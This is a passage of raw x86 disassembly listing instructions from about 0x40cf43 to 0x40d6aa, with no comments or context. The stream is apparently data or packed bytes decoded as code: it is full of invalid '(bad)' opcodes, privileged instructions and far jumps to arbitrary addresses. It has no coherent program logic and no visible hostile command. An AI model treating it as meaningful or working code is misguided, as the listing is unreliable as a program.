  40cf43:	sahf   
  40cf44:	popa   
  40cf45:	mov    eax,ds:0x335c39bc
  40cf4a:	loope  0x40ced9
  40cf4c:	add    al,0xd0
  40cf4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf4f:	sbb    eax,0xeae18960
  40cf54:	add    al,0xd6
  40cf56:	fdiv   QWORD PTR [esi]
  40cf58:	pop    ss
  40cf59:	loopne 0x40cf23
  40cf5b:	pop    ebp
  40cf5c:	mov    al,0xc7
  40cf5e:	dec    BYTE PTR [esi+0x63]
  40cf61:	ss js  0x40cf05
  40cf64:	add    al,0x59
  40cf66:	mov    BYTE PTR [ebp+0x4e60e2af],0x33
  40cf6d:	inc    edx
  40cf6e:	pop    esp
  40cf6f:	imul   esp,DWORD PTR [edi-0x6ce21896],0x20bb5929
  40cf79:	add    edi,esp
  40cf7b:	pop    eax
  40cf7c:	mov    gs,WORD PTR [ecx]
  40cf7e:	mov    ah,0x4
  40cf80:	enter  0x1382,0x11
  40cf84:	pop    ss
  40cf85:	xchg   ebp,eax
  40cf86:	popf   
  40cf87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf88:	jo     0x40cfda
  40cf8a:	cmp    eax,0x88f354bd
  40cf8f:	cmc    
  40cf90:	dec    ecx
  40cf91:	dec    ecx
  40cf92:	shl    esi,1
  40cf94:	add    BYTE PTR [ebx-0x31b5f2a4],cl
  40cf9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf9b:	adc    DWORD PTR [edx],esp
  40cf9d:	sub    ch,bl
  40cf9f:	iret   
  40cfa0:	outs   dx,DWORD PTR ds:[esi]
  40cfa1:	sub    al,0x3e
  40cfa3:	(bad)  
  40cfa4:	int3   
  40cfa5:	inc    edi
  40cfa6:	arpl   bx,di
  40cfa8:	sbb    DWORD PTR [ecx-0x77cc9de3],0xffffffcd
  40cfaf:	in     al,dx
  40cfb0:	fisttp WORD PTR [ebp-0x2f]
  40cfb3:	sahf   
  40cfb4:	mov    ebx,DWORD PTR [esi]
  40cfb6:	pop    ds
  40cfb7:	data16 jl 0x40d004
  40cfba:	jge    0x40d024
  40cfbc:	pop    edi
  40cfbd:	xchg   edi,eax
  40cfbe:	out    dx,eax
  40cfbf:	inc    ebp
  40cfc0:	popf   
  40cfc1:	jmp    0x578c:0x2bc783ed
  40cfc8:	pop    edi
  40cfc9:	cmp    al,0xe0
  40cfcb:	and    dl,BYTE PTR [ecx]
  40cfcd:	mov    ebx,0x51c35248
  40cfd2:	fucom  st(1)
  40cfd4:	mov    cl,0x86
  40cfd6:	cmp    BYTE PTR [edx],ah
  40cfd8:	jge    0x40cfed
  40cfda:	push   ds
  40cfdb:	cmc    
  40cfdc:	(bad)  
  40cfdd:	call   0x97bab8c9
  40cfe2:	inc    edx
  40cfe3:	add    al,0x67
  40cfe5:	xchg   di,ax
  40cfe7:	repnz repnz sti 
  40cfea:	sub    edx,DWORD PTR [edx-0x2965e28]
  40cff0:	xor    dl,dl
  40cff2:	jae    0x40cffc
  40cff4:	mov    edx,0x3c7eb10
  40cff9:	and    al,0x11
  40cffb:	shl    BYTE PTR [ecx-0xd],cl
  40cffe:	mov    al,ds:0xc284b4ca
  40d003:	dec    BYTE PTR ds:0xbc4a0aa
  40d009:	sti    
  40d00a:	ins    DWORD PTR es:[edi],dx
  40d00b:	int3   
  40d00c:	and    eax,0xfe46c285
  40d011:	outs   dx,DWORD PTR ds:[esi]
  40d012:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40d014:	inc    DWORD PTR [edi-0x77dd643b]
  40d01a:	dec    edx
  40d01b:	adc    eax,0xd9ec5368
  40d020:	outs   dx,BYTE PTR ds:[esi]
  40d021:	(bad)  
  40d022:	mov    bl,0x26
  40d024:	int    0x2d
  40d026:	mov    dl,0xee
  40d028:	out    0x2b,al
  40d02a:	fdivr  DWORD PTR [edi-0x57]
  40d02d:	add    BYTE PTR [edi+ebx*4-0x88c734a],al
  40d034:	sahf   
  40d035:	cmp    ebp,DWORD PTR [ebx+0x5b]
  40d038:	adc    bl,BYTE PTR [ecx-0x38]
  40d03b:	dec    ebx
  40d03c:	push   edx
  40d03d:	scas   al,BYTE PTR es:[edi]
  40d03e:	mov    ch,0xd6
  40d040:	repnz retf 0xe3e6
  40d044:	jl     0x40d07d
  40d046:	xor    eax,0x461620d9
  40d04b:	xchg   ebp,eax
  40d04c:	das    
  40d04d:	jae    0x40d00c
  40d04f:	inc    edi
  40d050:	stos   DWORD PTR es:[edi],eax
  40d051:	in     eax,dx
  40d052:	out    0xa5,al
  40d054:	shl    BYTE PTR [esi+0x2c1c7099],1
  40d05a:	pavgw  mm0,QWORD PTR [ebx-0x4ac498ab]
  40d061:	out    0x51,al
  40d063:	loopne 0x40cff0
  40d065:	xchg   esp,eax
  40d066:	mov    eax,DWORD PTR [edi-0x39]
  40d069:	pop    ecx
  40d06a:	test   BYTE PTR [ecx+eax*4+0x59b1fdb1],dh
  40d071:	mov    esp,0xb38af3d9
  40d076:	fmulp  st(7),st
  40d078:	pop    esi
  40d079:	enter  0xe971,0x33
  40d07d:	fimul  WORD PTR [ebx-0x3267439e]
  40d083:	call   0xfb68b34
  40d088:	cmc    
  40d089:	es fwait
  40d08b:	jge    0x40d0a1
  40d08d:	int    0xb0
  40d08f:	scas   eax,DWORD PTR es:[edi]
  40d090:	stos   DWORD PTR es:[edi],eax
  40d091:	fistp  QWORD PTR [edi+0x1a5ac6d]
  40d097:	cs popf 
  40d099:	repz jb 0x40d053
  40d09c:	inc    ebx
  40d09d:	out    0x59,al
  40d09f:	inc    edi
  40d0a0:	dec    ebp
  40d0a1:	xor    ebx,esp
  40d0a3:	push   esi
  40d0a4:	sbb    al,0x80
  40d0a6:	(bad)  
  40d0a7:	pop    edi
  40d0a8:	data16 cmp al,0x2b
  40d0ab:	aam    0xe
  40d0ad:	sbb    eax,0x437a4d0d
  40d0b2:	xchg   ebp,eax
  40d0b3:	mov    al,0x50
  40d0b5:	or     esi,DWORD PTR [esi+0x415602c5]
  40d0bb:	mulps  xmm7,XMMWORD PTR [ebp+0x17]
  40d0bf:	mov    dl,0x79
  40d0c1:	jnp    0x40d048
  40d0c3:	loopne 0x40d07e
  40d0c5:	mov    ch,0xff
  40d0c7:	push   eax
  40d0c8:	inc    esp
  40d0c9:	div    DWORD PTR [ecx+0x56]
  40d0cc:	fwait
  40d0cd:	jp     0x40d0ae
  40d0cf:	dec    eax
  40d0d0:	and    al,0x36
  40d0d2:	lahf   
  40d0d3:	leave  
  40d0d4:	jns    0x40d105
  40d0d6:	xor    DWORD PTR [ebp+eax*8+0x1d],esp
  40d0da:	inc    esi
  40d0db:	add    edx,DWORD PTR ds:0x997130d7
  40d0e1:	cmc    
  40d0e2:	icebp  
  40d0e3:	or     DWORD PTR [eax+ecx*8-0x12b89216],eax
  40d0ea:	inc    esi
  40d0eb:	iret   
  40d0ec:	nop
  40d0ed:	xchg   ecx,eax
  40d0ee:	jns    0x40d0cb
  40d0f0:	cmp    eax,esi
  40d0f2:	jp     0x40d0ae
  40d0f4:	jle    0x40d15c
  40d0f6:	fistp  DWORD PTR [ecx+eiz*4-0x6591fb1d]
  40d0fd:	aad    0x98
  40d0ff:	bound  edx,QWORD PTR [ebp-0x7feff97c]
  40d105:	leave  
  40d106:	inc    ebx
  40d107:	jne    0x40d156
  40d109:	(bad)  
  40d10a:	ss ret 
  40d10c:	mov    edx,0x3257f83b
  40d111:	xor    al,0xcf
  40d113:	jp     0x40d0a3
  40d115:	push   eax
  40d116:	daa    
  40d117:	pop    esi
  40d118:	mov    esi,0x343d9f43
  40d11d:	adc    eax,DWORD PTR [ebx-0x5a30484e]
  40d123:	or     ch,BYTE PTR [esi]
  40d125:	cmp    esi,0x5a85f7d7
  40d12b:	xor    BYTE PTR [edi+0x3e],bl
  40d12e:	dec    ebx
  40d12f:	xchg   BYTE PTR ds:0x84938289,dl
  40d135:	cmp    al,0x51
  40d137:	retf   0x459f
  40d13a:	jmp    0x2e0644f4
  40d13f:	dec    edi
  40d140:	mov    eax,ds:0x99af00dd
  40d145:	je     0x40d19b
  40d147:	retf   0x243e
  40d14a:	mov    esp,ebx
  40d14c:	mov    ebx,0x3e0c931
  40d151:	mov    WORD PTR [bx-0xe],fs
  40d155:	mov    ecx,0xb85bd24f
  40d15a:	add    eax,DWORD PTR [ebx]
  40d15c:	or     al,BYTE PTR [ebx]
  40d15e:	xor    eax,esp
  40d160:	sbb    eax,0xe9e42631
  40d165:	xchg   esi,eax
  40d166:	icebp  
  40d167:	mov    ch,0x96
  40d169:	aas    
  40d16a:	arpl   dx,di
  40d16c:	dec    ebx
  40d16d:	fiadd  WORD PTR [eax]
  40d16f:	adc    ah,cl
  40d171:	cmp    eax,0x4ca913ed
  40d176:	mov    eax,ds:0x89afe2de
  40d17b:	setl   BYTE PTR [ecx+0x2a]
  40d17f:	jns    0x40d1b9
  40d181:	addr16 inc ebp
  40d183:	pop    ebx
  40d184:	jno    0x40d1ed
  40d186:	push   0xffffff8d
  40d188:	hlt    
  40d189:	or     ch,BYTE PTR [ebx-0x61c22b1b]
  40d18f:	inc    esi
  40d190:	fadd   st,st(6)
  40d192:	scas   al,BYTE PTR es:[edi]
  40d193:	inc    eax
  40d194:	and    edx,DWORD PTR [edx+0x45aac303]
  40d19a:	hlt    
  40d19b:	out    0x83,eax
  40d19d:	iret   
  40d19e:	gs cld 
  40d1a0:	int3   
  40d1a1:	psubb  mm0,QWORD PTR [edi+ebx*4]
  40d1a5:	pusha  
  40d1a6:	test   DWORD PTR [edx+0xd],ecx
  40d1a9:	les    esp,FWORD PTR [eax-0x5c]
  40d1ac:	(bad)  
  40d1ad:	mov    ecx,0x5c03e841
  40d1b2:	mov    ds:0x7bbd70df,eax
  40d1b7:	mov    ebx,esi
  40d1b9:	pop    DWORD PTR [edi]
  40d1bb:	mov    eax,ds:0x90cc5439
  40d1c0:	jmp    0x5fef:0xbab74bb2
  40d1c7:	scas   eax,DWORD PTR es:[edi]
  40d1c8:	(bad)  
  40d1ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1cb:	in     al,dx
  40d1cc:	xchg   ecx,eax
  40d1cd:	pop    esp
  40d1ce:	pop    DWORD PTR [ebp+0x71]
  40d1d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1d2:	ficomp WORD PTR [eax-0x1699d743]
  40d1d8:	(bad)  
  40d1da:	gs or  bh,dl
  40d1dd:	in     al,0xf2
  40d1df:	js     0x40d163
  40d1e1:	loopne 0x40d18b
  40d1e3:	mov    edi,0xbda20840
  40d1e8:	imul   edi,DWORD PTR [ecx+0x75553744],0x3c
  40d1ef:	clc    
  40d1f0:	in     al,dx
  40d1f1:	and    ebx,DWORD PTR [eax-0x5f]
  40d1f4:	aam    0x5d
  40d1f6:	mov    ecx,0xe91a902f
  40d1fb:	cld    
  40d1fc:	or     al,0x7f
  40d1fe:	ret    0x51f1
  40d201:	push   esi
  40d202:	add    eax,0xb5f2b4b6
  40d207:	repz mov ecx,0xab1f1304
  40d20d:	push   eax
  40d20e:	add    al,al
  40d210:	mov    DWORD PTR [ebp+0x44c666e1],eax
  40d216:	cs push 0x2a
  40d219:	pop    ds
  40d21a:	fs es std 
  40d21d:	jg     0x40d1e5
  40d21f:	dec    ecx
  40d220:	fcmovnb st,st(2)
  40d222:	mov    edi,0x611aaf86
  40d227:	or     cl,BYTE PTR [ebx]
  40d229:	out    dx,eax
  40d22a:	sbb    al,0xe8
  40d22c:	fild   DWORD PTR [edi]
  40d22e:	mov    ch,0xe4
  40d230:	enter  0xc2f8,0xc9
  40d234:	sti    
  40d235:	jg     0x40d20e
  40d237:	(bad)  
  40d238:	sbb    ebx,DWORD PTR [ebp+eiz*8+0x31100655]
  40d23f:	arpl   WORD PTR [ebp+edx*1+0x67407feb],ax
  40d246:	lahf   
  40d247:	test   eax,0x59079567
  40d24c:	jg     0x40d2c8
  40d24e:	psadbw mm1,QWORD PTR [ecx+0x4f614276]
  40d255:	and    BYTE PTR [ecx+0x95a896d],0x73
  40d25c:	add    edi,DWORD PTR [eax+0x6]
  40d25f:	(bad)  
  40d260:	xor    al,0x9e
  40d262:	xchg   BYTE PTR [esi-0xb110f42],ch
  40d268:	add    DWORD PTR [edi],0xc5df0e37
  40d26e:	ret    
  40d26f:	mov    ah,0x9e
  40d271:	pop    ebp
  40d272:	js     0x40d20c
  40d274:	push   edx
  40d275:	rol    ebx,1
  40d277:	adc    DWORD PTR [ebp+0x8],0xc
  40d27b:	jge    0x40d24e
  40d27d:	cmp    DWORD PTR [ecx-0x25a3504d],edi
  40d283:	(bad)  
  40d285:	cmp    eax,DWORD PTR [edi]
  40d287:	rcr    dh,1
  40d289:	nop
  40d28a:	(bad)  
  40d28b:	ss dec edi
  40d28d:	retf   
  40d28e:	mov    DWORD PTR [ebp+0x3e],esp
  40d291:	aas    
  40d292:	test   DWORD PTR [edi],esp
  40d294:	pushf  
  40d295:	xor    DWORD PTR [ebx-0xf3783cc],edi
  40d29b:	jb     0x40d2fa
  40d29d:	dec    ebx
  40d29e:	dec    ecx
  40d29f:	mov    WORD PTR [eax+0x13ed8dda],es
  40d2a5:	jecxz  0x40d2b3
  40d2a7:	mov    esp,0x63a1bfc3
  40d2ac:	js     0x40d2c3
  40d2ae:	int3   
  40d2af:	test   DWORD PTR [ebp+0x21],esp
  40d2b2:	in     al,dx
  40d2b3:	fstp   TBYTE PTR [esp+ecx*1-0x595d7bc8]
  40d2ba:	mov    al,0xd3
  40d2bc:	jmp    0xca25fa74
  40d2c1:	dec    edx
  40d2c2:	pop    es
  40d2c3:	pmaxsw mm1,mm5
  40d2c6:	add    DWORD PTR [eax-0x22],esp
  40d2c9:	sar    DWORD PTR [edx],cl
  40d2cb:	or     eax,0x6dd43cec
  40d2d0:	es dec ebp
  40d2d2:	ins    DWORD PTR es:[edi],dx
  40d2d3:	rcl    DWORD PTR [edx-0xa32a574],cl
  40d2d9:	xor    ecx,edi
  40d2db:	mov    al,ds:0xe94af210
  40d2e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2e1:	enter  0xa50b,0x80
  40d2e5:	mov    cl,0x7a
  40d2e7:	pop    edx
  40d2e8:	pop    eax
  40d2e9:	outs   dx,BYTE PTR ds:[esi]
  40d2ea:	dec    esp
  40d2eb:	adc    ch,ch
  40d2ed:	je     0x40d27b
  40d2ef:	stc    
  40d2f0:	cwde   
  40d2f1:	jbe    0x40d2de
  40d2f3:	repz xchg ebx,eax
  40d2f5:	mov    edx,0xf5a2580e
  40d2fa:	rcr    DWORD PTR [ecx-0x4dbcde1c],0x9b
  40d301:	rol    BYTE PTR [edi-0x6d],1
  40d304:	sahf   
  40d305:	cmp    eax,DWORD PTR [eax+0x6979c188]
  40d30b:	sbb    BYTE PTR [ebp+0x7f],bl
  40d30e:	outs   dx,DWORD PTR ds:[esi]
  40d30f:	cmp    DWORD PTR [edx],ebp
  40d311:	push   ebp
  40d312:	nop
  40d313:	or     dh,cl
  40d315:	shr    bh,cl
  40d317:	cwde   
  40d318:	jmp    0x184c:0x8f393801
  40d31f:	sub    al,0xb8
  40d321:	sar    DWORD PTR [esi+0x1a],0xba
  40d325:	ret    0x844e
  40d328:	scas   eax,DWORD PTR es:[edi]
  40d329:	fisub  WORD PTR [ebp+0x6bee5ba3]
  40d32f:	cs loop 0x40d32e
  40d332:	pop    edx
  40d333:	xor    dh,0x9a
  40d336:	mov    esp,0xebb7e788
  40d33b:	cwde   
  40d33c:	shl    ebp,1
  40d33e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d33f:	xor    ecx,eax
  40d341:	mov    WORD PTR [eax-0xcdb7898],?
  40d347:	dec    eax
  40d348:	test   al,0xc5
  40d34a:	es enter 0x34c1,0x3d
  40d34f:	ins    DWORD PTR es:[edi],dx
  40d350:	lods   eax,DWORD PTR ds:[esi]
  40d351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d352:	fiadd  DWORD PTR [ebp+0x459d2f75]
  40d358:	pop    eax
  40d359:	sahf   
  40d35a:	or     al,0x4b
  40d35c:	jecxz  0x40d32c
  40d35e:	gs call 0x39c:0x614085cf
  40d366:	mov    ds,WORD PTR [esi+ebx*2-0x72]
  40d36a:	cmp    al,0xd0
  40d36c:	aam    0x5a
  40d36e:	mov    gs,WORD PTR [edi-0x2a]
  40d371:	cld    
  40d372:	pusha  
  40d373:	ins    BYTE PTR es:[edi],dx
  40d374:	sub    eax,ebp
  40d376:	(bad)  
  40d377:	push   ss
  40d378:	add    al,0xf3
  40d37a:	aaa    
  40d37b:	dec    edx
  40d37c:	pop    ebp
  40d37d:	jns    0x40d394
  40d37f:	sbb    DWORD PTR [ebx-0x42b6f774],ebp
  40d385:	jno    0x40d318
  40d387:	cli    
  40d388:	pop    ss
  40d389:	pop    edx
  40d38a:	test   bh,bh
  40d38c:	ja     0x40d38d
  40d38e:	in     eax,0x66
  40d390:	pop    ecx
  40d391:	out    0x11,eax
  40d393:	dec    ebx
  40d394:	int    0x23
  40d396:	inc    eax
  40d397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d398:	les    esp,FWORD PTR [esi+0xb1a510b]
  40d39e:	stc    
  40d39f:	pop    es
  40d3a0:	pop    es
  40d3a1:	mov    DWORD PTR [edi],eax
  40d3a3:	clc    
  40d3a4:	ret    
  40d3a5:	cmc    
  40d3a6:	cld    
  40d3a7:	mov    BYTE PTR [ecx],0x5e
  40d3aa:	push   eax
  40d3ab:	mov    bl,0x21
  40d3ad:	or     eax,esi
  40d3af:	stc    
  40d3b0:	push   ecx
  40d3b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3b2:	or     al,0xf4
  40d3b4:	sub    ch,BYTE PTR [edx-0x27]
  40d3b7:	enter  0x6872,0xe6
  40d3bb:	(bad)  
  40d3bc:	out    0xc7,eax
  40d3be:	add    DWORD PTR [eax+ebp*8-0x586805bc],0x3ffa1cd8
  40d3c9:	mov    cl,0x9c
  40d3cb:	out    0x21,eax
  40d3cd:	cli    
  40d3ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3cf:	jl     0x40d3a3
  40d3d1:	and    ebx,ecx
  40d3d3:	push   0x1d
  40d3d5:	in     al,dx
  40d3d6:	sahf   
  40d3d7:	push   0xffffffe6
  40d3d9:	jp     0x40d3c6
  40d3db:	push   es
  40d3dc:	imul   ebx,DWORD PTR ds:0xa78e79b2,0xf3b3abd6
  40d3e6:	pop    ebp
  40d3e7:	and    BYTE PTR [esi-0x7cc0ac6d],0x66
  40d3ee:	lock or ecx,0x926ef016
  40d3f5:	aas    
  40d3f6:	cmp    al,0xe3
  40d3f8:	cmp    ebp,ebp
  40d3fa:	inc    ebx
  40d3fb:	dec    edi
  40d3fc:	imul   ebp,DWORD PTR [ecx-0x6814c888],0xdf12eaff
  40d406:	(bad)  
  40d407:	in     eax,dx
  40d408:	lea    ebx,[edx+0x22]
  40d40b:	ins    BYTE PTR es:[edi],dx
  40d40c:	or     bh,BYTE PTR [eax+0x4a]
  40d40f:	test   BYTE PTR [ebp+0x5dcbf286],dl
  40d415:	pop    ebx
  40d416:	sub    BYTE PTR [ebx+0x6c],bh
  40d419:	fadd   QWORD PTR [ebx-0x6fbf511d]
  40d41f:	sbb    esi,edx
  40d421:	cmp    BYTE PTR [edi],ch
  40d423:	cmp    ebp,DWORD PTR [ecx+eiz*4+0x69]
  40d427:	xor    ecx,DWORD PTR [edi]
  40d429:	loope  0x40d3d3
  40d42b:	xor    eax,DWORD PTR [ebx]
  40d42d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d42e:	inc    esi
  40d42f:	pop    ecx
  40d430:	cld    
  40d431:	in     al,0xc2
  40d433:	sar    BYTE PTR [edx+0x7d],1
  40d436:	or     DWORD PTR [ebp+0x38],ebx
  40d439:	jmp    0x40d3c5
  40d43b:	xchg   esi,eax
  40d43c:	mov    bl,0xc8
  40d43e:	jp     0x40d444
  40d440:	or     DWORD PTR [ecx+0x65],edx
  40d443:	push   cs
  40d444:	clc    
  40d445:	mov    edi,0x5c45d096
  40d44a:	mov    ecx,0xcbffe988
  40d44f:	(bad)  
  40d450:	or     DWORD PTR [eax+eiz*8+0xff8acf2],0x5da498f5
  40d45b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d45c:	lods   eax,DWORD PTR ds:[esi]
  40d45d:	shl    DWORD PTR [ecx-0x4faf798b],cl
  40d463:	sti    
  40d464:	pop    ds
  40d465:	inc    eax
  40d466:	stc    
  40d467:	jg     0x40d49e
  40d469:	xchg   edi,eax
  40d46a:	push   ebx
  40d46b:	fadd   QWORD PTR [edi+0x719067e]
  40d471:	outs   dx,BYTE PTR ds:[esi]
  40d472:	out    dx,eax
  40d473:	adc    al,0xae
  40d475:	imul   DWORD PTR [ebx-0x1f]
  40d478:	ins    BYTE PTR es:[edi],dx
  40d479:	sub    ebx,DWORD PTR [ecx]
  40d47b:	clc    
  40d47c:	into   
  40d47d:	pcmpgtd mm3,QWORD PTR [esi]
  40d480:	xor    dh,BYTE PTR [edi+0x21]
  40d483:	jnp    0x40d444
  40d485:	push   esp
  40d486:	or     al,0xd1
  40d488:	js     0x40d40d
  40d48a:	cld    
  40d48b:	xchg   ecx,esi
  40d48d:	cmp    ah,dh
  40d48f:	jmp    0x40d4c0
  40d491:	imul   esi,DWORD PTR [ebx+0x342653ff],0x6421de0b
  40d49b:	sub    edi,edx
  40d49d:	adc    DWORD PTR [edx+edx*2-0x54bdcc19],esi
  40d4a4:	fcom   DWORD PTR [ebx]
  40d4a6:	push   esi
  40d4a7:	rol    DWORD PTR [ecx-0x60add3fc],cl
  40d4ad:	pop    edx
  40d4ae:	pop    ds
  40d4af:	aam    0x38
  40d4b1:	inc    ebx
  40d4b2:	pop    ebp
  40d4b3:	jmp    0xe118c856
  40d4b8:	push   ds
  40d4b9:	(bad)
  40d4bd:	push   eax
  40d4be:	(bad)  
  40d4bf:	aaa    
  40d4c0:	mov    ds:0x4604dcd4,al
  40d4c5:	fwait
  40d4c6:	(bad)  
  40d4c7:	jecxz  0x40d495
  40d4c9:	dec    edx
  40d4ca:	fwait
  40d4cb:	pop    es
  40d4cc:	dec    edx
  40d4cd:	xor    ebx,DWORD PTR [eax-0x4d]
  40d4d0:	jno    0x40d4be
  40d4d2:	retf   
  40d4d3:	inc    ebx
  40d4d4:	cli    
  40d4d5:	dec    esp
  40d4d6:	mov    al,0xa5
  40d4d8:	xchg   BYTE PTR [ecx],bh
  40d4da:	mov    gs,ecx
  40d4dc:	add    eax,0x137ca0e3
  40d4e1:	push   edx
  40d4e2:	shl    DWORD PTR [esi+esi*4+0x6a1a2734],cl
  40d4e9:	imul   ecx,DWORD PTR [ebp-0x1d],0x2821c3d2
  40d4f0:	int    0xdc
  40d4f2:	jno    0x40d565
  40d4f4:	jne    0x40d572
  40d4f6:	out    0xd1,eax
  40d4f8:	jg     0x40d538
  40d4fa:	cs push ss
  40d4fc:	sbb    ch,dl
  40d4fe:	sub    eax,0x5436ab39
  40d503:	ret    
  40d504:	cmp    ch,0xc3
  40d507:	sub    edx,DWORD PTR [ecx-0x6e]
  40d50a:	call   0xf628:0xc02e93d2
  40d511:	lea    edx,[eax+0x18]
  40d514:	lods   eax,DWORD PTR ds:[esi]
  40d515:	mov    bl,0x94
  40d517:	pop    ecx
  40d518:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40d51a:	call   0x6218e8bc
  40d51f:	pop    ebx
  40d520:	mov    al,ds:0xee514be2
  40d525:	lock push 0x40
  40d528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d529:	addr16 enter 0xe141,0x9
  40d52e:	(bad)  
  40d52f:	xchg   ebx,eax
  40d530:	std    
  40d531:	pop    ebx
  40d532:	sub    eax,edx
  40d534:	sbb    bl,BYTE PTR [ebp-0x2b]
  40d537:	push   esp
  40d538:	cwde   
  40d539:	jo     0x40d4fc
  40d53b:	push   edi
  40d53c:	in     al,dx
  40d53d:	mov    eax,0xf4e0f747
  40d542:	adc    al,0x69
  40d544:	jbe    0x40d53d
  40d546:	fld    QWORD PTR [esi*8-0x7efc524b]
  40d54d:	mov    esp,0xd12a01e8
  40d552:	(bad)  
  40d553:	cmc    
  40d554:	mov    ?,WORD PTR [edi]
  40d556:	adc    eax,0xeb34093e
  40d55b:	xchg   BYTE PTR [ebp+esi*8+0x1a25b3ca],ah
  40d562:	jae    0x40d5a2
  40d564:	mov    ebp,0x653d558b
  40d569:	push   DWORD PTR [edi]
  40d56b:	xor    BYTE PTR [esi-0x4b8e75a9],dl
  40d571:	std    
  40d572:	and    ah,cl
  40d574:	mov    eax,DWORD PTR [ebx]
  40d576:	repz pop ss
  40d578:	jmp    0xacc9ae93
  40d57d:	jg     0x40d5a6
  40d57f:	inc    ecx
  40d580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d581:	es xchg edx,eax
  40d583:	ins    BYTE PTR es:[edi],dx
  40d584:	je     0x40d51f
  40d586:	push   edi
  40d587:	call   0xbfc5:0x3eacb59a
  40d58e:	xchg   ecx,eax
  40d58f:	arpl   si,ax
  40d591:	or     BYTE PTR [ebx-0x60],bh
  40d594:	rol    DWORD PTR [ebp+0x20],cl
  40d597:	lea    esi,[ecx]
  40d599:	mov    ebp,0x9759f82a
  40d59e:	fimul  DWORD PTR [esi+0x265a1111]
  40d5a4:	rcl    DWORD PTR [ecx-0x6b2bdf2],cl
  40d5aa:	mov    edi,0xd73eac9f
  40d5af:	shl    BYTE PTR [ecx],cl
  40d5b1:	cmc    
  40d5b2:	add    BYTE PTR [ecx+eiz*2],ch
  40d5b5:	xor    DWORD PTR [edx-0xd],esi
  40d5b8:	push   esi
  40d5b9:	rol    edx,cl
  40d5bb:	int    0x75
  40d5bd:	out    0x9c,eax
  40d5bf:	mov    ah,0x7c
  40d5c1:	pop    ds
  40d5c2:	or     BYTE PTR [edi+ecx*2+0x79],ch
  40d5c6:	xchg   bh,al
  40d5c8:	adc    BYTE PTR [ebp-0x72b01c56],cl
  40d5ce:	aad    0xaf
  40d5d0:	cmp    al,BYTE PTR [ebx-0x41]
  40d5d3:	xchg   ebp,eax
  40d5d4:	sub    ebp,ebx
  40d5d6:	mov    ebx,0x7d349180
  40d5db:	(bad)  
  40d5dc:	sub    al,BYTE PTR [eax+0x69]
  40d5df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5e0:	mov    ecx,0xc6b36518
  40d5e5:	mov    dl,0x3a
  40d5e7:	iret   
  40d5e8:	push   0xc74b93b2
  40d5ed:	sti    
  40d5ee:	jae    0x40d61f
  40d5f0:	cdq    
  40d5f1:	push   esp
  40d5f2:	sti    
  40d5f3:	shr    DWORD PTR [ecx+0x30],cl
  40d5f6:	adc    ebx,esp
  40d5f8:	mov    edi,eax
  40d5fa:	mov    DWORD PTR ds:0x8f53e28a,edx
  40d600:	test   BYTE PTR [edi-0x5],bh
  40d603:	mov    edx,DWORD PTR [edi-0x6d68e417]
  40d609:	out    dx,al
  40d60a:	imul   ebp,DWORD PTR [ebx],0x6c06d94c
  40d610:	mov    edi,0xe33d5f58
  40d615:	iret   
  40d616:	(bad)  
  40d618:	dec    ebx
  40d619:	pop    ss
  40d61a:	retf   0x909e
  40d61d:	call   0x3ca6f4a1
  40d622:	js     0x40d631
  40d624:	loope  0x40d5cf
  40d626:	dec    edx
  40d627:	mov    ch,0x6b
  40d629:	cld    
  40d62a:	xor    al,0xa8
  40d62c:	xor    dh,ah
  40d62e:	xor    eax,0x542e952e
  40d633:	jnp    0x40d688
  40d635:	mov    ch,0x9f
  40d637:	retf   0x4729
  40d63a:	xchg   esi,eax
  40d63b:	xchg   edi,eax
  40d63c:	ficomp WORD PTR [edx-0x54]
  40d63f:	xchg   edi,eax
  40d640:	mov    al,ds:0xae5ac7f9
  40d645:	dec    ebp
  40d646:	aas    
  40d647:	xor    BYTE PTR [edx-0x5318fe8d],0xa3
  40d64e:	std    
  40d64f:	aam    0x9f
  40d651:	jo     0x40d6a8
  40d653:	retf   
  40d654:	iret   
  40d655:	bound  esi,QWORD PTR [esi]
  40d657:	pop    ss
  40d658:	add    ebx,DWORD PTR [eax+eiz*8]
  40d65b:	es pop eax
  40d65d:	adc    al,0x98
  40d65f:	or     ch,bl
  40d661:	iret   
  40d662:	not    edx
  40d664:	push   0x1c
  40d666:	ins    DWORD PTR es:[edi],dx
  40d667:	mov    ch,0xd9
  40d669:	and    edx,edi
  40d66b:	mov    bh,0xf1
  40d66d:	xchg   esi,eax
  40d66e:	(bad)  
  40d66f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d670:	(bad)  
  40d671:	xor    al,0xd1
  40d673:	into   
  40d674:	(bad)  
  40d675:	and    al,0xc0
  40d677:	mov    dl,BYTE PTR [edx]
  40d679:	sahf   
  40d67a:	call   0x1abb18f1
  40d67f:	jne    0x40d6c9
  40d681:	int3   
  40d682:	lahf   
  40d683:	pop    ebx
  40d684:	inc    edi
  40d685:	ficomp DWORD PTR [ebx-0x5ec60139]
  40d68b:	mov    edi,0xda523068
  40d690:	mov    ch,0xc1
  40d692:	imul   ebx,DWORD PTR [eax+eiz*8-0x17d555d9],0xeed4918f
  40d69d:	inc    ebp
  40d69e:	dec    ecx
  40d69f:	adc    eax,0xe07cd494
  40d6a4:	(bad)  
  40d6a5:	js     0x40d70d
  40d6a7:	stos   DWORD PTR es:[edi],eax
  40d6a8:	and    al,0x2b
  40d6aa:	test   DWORD PTR [ebx-0x6f3871da],esp
